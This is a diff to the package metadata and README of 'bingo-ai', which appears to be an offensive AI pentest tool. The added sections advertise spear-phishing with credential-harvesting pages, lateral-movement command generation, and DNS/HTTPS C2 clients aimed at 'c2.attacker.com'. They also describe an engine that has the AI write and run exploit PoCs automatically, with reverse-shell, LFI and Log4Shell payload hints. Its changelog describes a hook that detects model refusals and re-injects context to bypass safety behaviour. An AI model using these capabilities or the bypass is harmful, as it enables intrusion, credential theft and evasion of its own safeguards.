@@ -1,6 +1,6 @@
 Metadata-Version: 2.4
 Name: bingo-ai
-Version: 3.5.18
+Version: 3.5.21
 Summary: AI-powered red team terminal — Zero-Hallucination · WAF bypass · XSS·Upload·SSRF·OAuth·GraphQL·Smuggling exploit chains · role-based testing · vuln manager · attack chain · HITL · LLM Orchestrator · multi-model · multi-language
 Author-email: bingook <bingook@users.noreply.github.com>
 License: MIT
@@ -55,7 +55,7 @@ Description-Content-Type: text/markdown
 
 **The #1 AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-3.5.0-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.5.21-brightgreen)](https://github.com/bingook/bingo/releases)
 [![Python](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
@@ -1366,6 +1366,180 @@ When AI coding agents (Claude Code, GitHub Copilot, Gemini CLI) run inside GitHu
 
 ---
 
+## New in v3.5.21 — Full APT-ification: AI Phishing · Supply Chain · Lateral Movement · Covert C2
+
+> **v3.5.21** introduces four APT-grade offensive modules under a unified `/apt` slash command, with automatic chat-mode detection and multilingual (KO/ZH/EN) hints.
+
+### APT Module Overview
+
+| Module | Command | Description |
+|---|---|---|
+| AI Spear-Phishing | `/apt phish <email> [lure]` | OSINT profiling → personalised spear-phishing email + HTML credential harvesting page + GoPhish config |
+| Supply Chain Scanner | `/apt supply <path>` | npm/pip/GitHub Actions dependency scan — Dependency Confusion, Typosquatting, malicious-package IOC lookup |
+| Lateral Movement | `/apt lateral <ip> [user] [hash]` | Impacket/CrackMapExec/SSH/BloodHound/PTH/PTT command auto-generation |
+| Covert C2 Channel | `/apt c2 <host> [dns\|https\|both]` | DNS-tunnelling C2 (base32/TXT) + HTTPS Beacon C2 (AES-256-CBC, Jitter, Domain Fronting) |
+
+### New files
+
+```
+bingo/core/apt/__init__.py
+bingo/core/apt/phishing.py        # Module 1 — AI spear-phishing
+bingo/core/apt/supply_chain.py    # Module 2 — supply chain vuln scanner
+bingo/core/apt/lateral_movement.py# Module 3 — internal network lateral movement
+bingo/core/apt/c2_channel.py      # Module 4 — covert C2 channel generator
+```
+
+### Quick Start
+
+```python
+# Spear-phishing
+from bingo.core.apt.phishing import quick_phish
+result = quick_phish("ceo@target.com", lure="invoice")
+print(result.subject, result.body)
+
+# Supply chain scan
+from bingo.core.apt.supply_chain import SupplyChainScanner
+findings = SupplyChainScanner("./package.json").scan()
+
+# Lateral movement commands
+from bingo.core.apt.lateral_movement import quick_lateral_commands
+cmds = quick_lateral_commands("10.0.0.5", username="admin", password="hash123")
+
+# Covert C2 — DNS tunnel
+from bingo.core.apt.c2_channel import CovertC2
+c2 = CovertC2("c2.attacker.com"); print(c2.generate_dns_client())
+
+# Covert C2 — HTTPS Beacon
+c2 = CovertC2("cdn.attacker.com"); print(c2.generate_https_client())
+```
+
+### Chat-mode auto-detection (v3.5.21)
+
+After every command execution bingo scans output for APT context and injects contextual hints:
+
+| Detected pattern | Auto-hint |
+|---|---|
+| Private IP / SMB / RPC / LDAP | `🔀 Internal network detected — /apt lateral <IP>` |
+| `package.json` / `requirements.txt` / `.github/workflows` | `⛓️ Supply chain file detected — /apt supply <path>` |
+| Email address / LinkedIn / OSINT | `🎣 Phishing context detected — /apt phish <email>` |
+| C2 / beacon / callback / tunnel | `🕵️ C2 context detected — /apt c2 <host>` |
+
+> All modules generate commands/scripts only. No live attacks are executed without explicit user action. Use in authorised red team / penetration test environments only.
+
+---
+
+## New in v3.5.20 — 0day Hunter: 5 Real-World 0day/N-day Exploits Integrated
+
+> **v3.5.20** extends 0day Hunter with five research-grade vulnerability modules that activate automatically in chat mode.
+
+### Newly integrated vulnerabilities
+
+| CVE / ID | Target | Class | PoC Module |
+|---|---|---|---|
+| CVE-2024-41713 | Mitel MiCollab | Auth Bypass (`..;/` path normalization) | `bingo.core.exploits.mitel_micollab` |
+| CVE-2024-35286 | Mitel MiCollab | Time-based SQL Injection | `bingo.core.exploits.mitel_micollab` |
+| 0day LFI | Mitel MiCollab `ReconcileWizard` | Arbitrary File Read (post-auth) | `bingo.core.exploits.mitel_micollab` |
+| CVE-2024-20017 | MediaTek `wappd` / OpenWrt | UDP Stack Buffer Overflow → DoS / RCE | `bingo.core.exploits.mediatek_wappd` |
+| CVE-2023-4863 | libwebp (Chrome, Electron…) | Huffman Table Heap Overflow (BLASTPASS) | `bingo.core.exploits.webp_cve2023_4863` |
+| CVE-2023-4911 | glibc ≤ 2.34 | `GLIBC_TUNABLES` LPE (Looney Tunables) | `bingo.core.exploits.glibc_tunables` |
+| CVE-2024-43035 | RAGFlow | IDOR | `zeroday.py` hint |
+| CVE-2024-48946 | Monaco / Hulu service | Pickle RCE | `zeroday.py` hint |
+| CVE-2024-9301 | LogAI | Path Traversal | `zeroday.py` hint |
+
+### How it works in chat mode
+
+1. AI generates and runs a shell command.
+2. **Dir-1 Detection** — output is scanned for version strings and error patterns of all known targets.
+3. **Dir-2 Exploitation** — matching exploit module import hint is printed to console; AI is given PoC generation instructions.
+4. **Dir-3 Utilization** — local CVE DB lookup + live NVD API query; Shodan/Censys hints injected.
+
+```python
+# Example: run Mitel MiCollab full chain manually
+from bingo.core.exploits.mitel_micollab import MitelMiCollabExploit
+x = MitelMiCollabExploit("https://micollab.target.com")
+print(x.run_full_chain())
+
+# Example: detect MediaTek wappd vulnerability
+from bingo.core.exploits.mediatek_wappd import WappdExploit
+w = WappdExploit("192.168.1.1")
+print(w.detect())
+
+# Example: detect glibc LPE (Looney Tunables)
+from bingo.core.exploits.glibc_tunables import GlibcTunablesExploit
+g = GlibcTunablesExploit()
+print(g.detect())
+```
+
+---
+
+## New in v3.5.19 — 0day Hunter: Automatic Vulnerability Detection & Exploitation
+
+> **Every pentest execution output is now automatically analyzed for 0day / N-day candidates.**
+> No manual triggers required — the engine runs silently after each AI code execution.
+
+### 🎯 Three Directions, One Engine
+
+#### Direction 1 — Detection
+- **Version fingerprinting**: 35+ software patterns (Apache, nginx, PHP, OpenSSL, Log4j, Confluence, Spring, GitLab, WebLogic, Grafana, etc.)
+- **Error pattern detection**: 33 patterns covering SQL errors, LFI indicators, RCE traces, JNDI references, path disclosure, credential leaks, ASAN crashes, and more
+- Confidence scoring: `HIGH` / `MEDIUM` / `LOW` with session-level deduplication (same candidate reported only once per session)
+
+#### Direction 2 — Exploitation (Automatic PoC Generation)
+- After detection, immediately injects candidates into AI context with exploit class labels
+- Per-class exploit hints:
+  - `rce` → reverse shell payloads, command injection
+  - `lfi` → `/etc/passwd`, `php://filter`, log poisoning
+  - `sql_injection` → error-based, union, blind, time-based
+  - `log4shell` → `${jndi:ldap://...}` payload in all HTTP headers
+  - `memory_corruption` → cyclic pattern fuzzing, ASAN analysis
+  - `credential_leak` → immediate credential testing
+  - `ssrf` → cloud metadata endpoint probing (`169.254.169.254`)
+- AI generates and executes Python PoC code automatically
+
+#### Direction 3 — Utilization (CVE Mapping + Intelligence)
+- **Local CVE DB**: Instant offline mapping for 35 high-impact (software, version) pairs:
+  - `Apache 2.4.49` → `CVE-2021-41773` (path traversal / RCE)
+  - `Log4j 2.14.x` → `CVE-2021-44228` (Log4Shell)
+  - `Confluence 7.13-7.16` → `CVE-2022-26134` (OGNL RCE)
+  - `Spring Boot 2.6-2.7` → `CVE-2022-22965` (Spring4Shell)
+  - `OpenSSL 1.0.1` → `CVE-2014-0160` (Heartbleed)
+  - `GitLab 11.9-12.0` → `CVE-2021-22205` (RCE via ExifTool)
+  - `Grafana 8.x` → `CVE-2021-43798` (path traversal)
+  - And 28 more...
+- **Live NVD API**: Queries `services.nvd.nist.gov/rest/json/cves/2.0` for HIGH-severity CVEs when local DB misses (timeout: 6s, graceful fallback)
+- Direct NVD link: `https://nvd.nist.gov/vuln/search/results?query=CVE-XXXX-XXXXX`
+
+### 🔄 Automatic Flow
+
+```
+AI executes code
+      ↓
+Execution output captured
+      ↓
+ZeroDayHunter.analyze() → Dir-1 Detection
+      ↓
+CVE lookup → Dir-3 Utilization
+      ↓
+[ZERODAY_CANDIDATES_DETECTED] injected into AI history
+      ↓
+AI generates PoC code → Dir-2 Exploitation
+      ↓
+PoC executed → result reported → next stage
+```
+
+### 🖥️ Console Output Example
+
+```
+🎯 0day Hunter: 🔴 HIGH×2 | 🟡 MED×1 — Apache HTTPD 2.4.49 (CVE-2021-41773), lfi_passwd, PHP 7.4.3
+⬆ 0day Hunter auto-forwarded candidates to AI — PoC code generation starting
+```
+
+### Zero Configuration
+
+No setup required. Works in all modes: chat, orch, batch, headless.
+
+---
+
 ## New in v3.5.0 — LLM Orchestrator: Programmable Attack Pipeline
 
 > **The core limitation of v3.4.x:** six phases were hardcoded, fifteen branches were fixed.
@@ -1809,6 +1983,12 @@ No manual configuration needed — activates silently and retries.
 
 | Version | Summary |
 |---------|---------|
+| v3.5.21 | **Full APT-ification** — 4 new APT modules (`bingo/core/apt/`): AI spear-phishing generator (OSINT profiling, HTML lure page, GoPhish config), supply chain vuln scanner (npm/pip/GitHub Actions, Dependency Confusion, Typosquatting, malicious-pkg IOC), internal-network lateral movement (Impacket/CME/SSH/BloodHound/PTH/PTT command gen), covert C2 channel (DNS-tunnel base32/TXT + HTTPS Beacon AES-256-CBC + Jitter + Domain Fronting); `/apt` slash command; chat-mode auto-detection for all 4 contexts; 17 new multilingual i18n keys (KO/ZH/EN) |
+| v3.5.20 | **0day Hunter v2** — 5 research-grade 0day/N-day exploit modules: CVE-2024-41713 / CVE-2024-35286 / 0day-LFI (Mitel MiCollab), CVE-2024-20017 (MediaTek wappd UDP overflow), CVE-2023-4863 (libwebp BLASTPASS heap overflow), CVE-2023-4911 (glibc Looney Tunables LPE), CVE-2024-43035 / CVE-2024-48946 / CVE-2024-9301 (ZeroPath IDOR/RCE/Traversal); 4 new `bingo/core/exploits/` PoC modules; auto exploit-module hint injection in chat mode; 8 new multilingual i18n keys (KO/ZH/EN) |
+| v3.5.19 | **0day Hunter** — Dir-1 Detection (version fingerprinting + 33 error patterns), Dir-2 Exploitation (per-class PoC payload hints + auto code generation), Dir-3 Utilization (local CVE DB for 35 software × known versions + live NVD API lookup, Shodan fallback hint); activates automatically in every chat execution output; 7 new multilingual i18n keys (KO/ZH/EN); new `bingo/core/zeroday.py` |
+| v3.5.18 | macOS VPN banner wording fix (auto-resolve timing accuracy) |
+| v3.5.17 | **macOS VPN DNS Spoof Auto-Fix** — auto-resolves real IPs via `dig @8.8.8.8` / `nslookup` while keeping VPN active; injects real IPs into AI context; falls back to Shodan/crt.sh hints if DNS resolution fails; LLM explicitly forbidden from asking user to disable VPN |
+| v3.5.16 | macOS VPN `198.18.x.x` virtual IP detection + warning injection |
 | v3.5.0 | **LLM Orchestrator** — dynamic attack pipeline replacing hardcoded 6-phase flow; decision LLM runs in isolated mini-session; full Blackboard/AttackChain/HitlGate integration; `/orch start\|stop\|status\|log\|report`; custom goal + step limit; structured JSON decision format with confidence scoring; 12 new multilingual i18n keys (KO/ZH/EN) |
 | v3.4.0 | **Intelligence Platform Upgrade** — 8 new modules: role-based testing (5 built-in roles + YAML custom), vulnerability manager (SQLite CRUD, severity/status tracking), project blackboard (cross-session target facts), YAML external tool recipes (nmap/sqlmap/ffuf/nuclei/subfinder), local knowledge base (markdown injection), batch execution (multi-target queue), attack chain tracker (auto-classify steps), Human-in-the-loop gate (dangerous action confirmation); 33 new multilingual i18n keys (KO/ZH/EN) |
 | v3.3.5 | **tgtylab 6-Layer Model Bypass** — Identity Lock (§0), Thinking Redirect (§1), Example Flood 50+ patterns (§2), Operational Context framing (§3), Forbidden Language list (§4), Pre-tool-call hook with refusal detection + context re-injection (§5); new `bingo/hooks/` module; works across DeepSeek/Claude/GPT/GLM/Qwen; 10 new i18n keys |
@@ -1919,7 +2099,7 @@ MIT © 2026 bingook
 
 *The only AI pentest terminal with built-in engines, HTTP smuggling, anti-hallucination guard, role-based testing, vuln manager, target memory, and LLM Orchestrator.*
 
-[![Version](https://img.shields.io/badge/version-3.5.0-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.5.21-brightgreen)](https://github.com/bingook/bingo/releases)
 [![PyPI](https://img.shields.io/pypi/v/bingo-ai.svg)](https://pypi.org/project/bingo-ai/)
 
 </div>
